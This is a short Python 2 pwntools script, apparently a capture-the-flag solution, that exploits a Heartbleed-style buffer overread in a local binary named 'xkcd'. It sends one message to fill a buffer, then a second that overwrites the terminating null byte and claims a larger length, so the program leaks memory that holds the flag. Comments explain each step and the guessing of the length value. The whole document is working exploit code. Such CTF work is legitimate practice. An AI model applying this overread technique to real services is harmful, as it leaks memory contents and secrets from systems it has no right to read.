#!/usr/bin/env python2
from pwn import *
# Simple buffer overread to get the flag, but it inserts a null byte
# However we can send two messages, one to fill our buffer and the second to replace the first null byte
#context.log_level = 'DEBUG'
template = 'SERVER, ARE YOU STILL THERE? IF SO, REPLY "%s" (%s LETTERS)'

r = process("./xkcd")
# send 513 characters, which will fill the globals[] buffer
r.sendline(template % ('a' * 511, '511'))
r.recvline()
# now send 514 characters + some length, to overwrite the previous null
# read more than we send, it will place another null byte after the flag, and show us the flag
# if we guess too high we will get nice try, if we guess to low we won't get the whole flag
r.sendline(template % ('a' * 512, '539')) # need to fiddle with the second number
print r.recvline()
